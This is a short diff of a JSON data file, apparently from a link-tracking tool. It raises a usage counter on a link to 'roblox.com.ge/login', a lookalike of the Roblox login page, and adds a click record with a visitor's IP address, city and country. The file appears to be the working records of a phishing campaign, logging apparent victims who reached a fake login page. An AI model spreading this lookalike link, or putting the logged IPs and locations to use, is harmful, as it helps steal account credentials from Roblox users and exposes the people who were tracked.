@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1392,
+    "useCount": 1393,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11304,6 +11304,14 @@
         "city": "Sosua, Cabarete",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777425559315,
+        "ip": "122.54.92.184",
+        "country": "Philippines",
+        "city": "Antipolo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
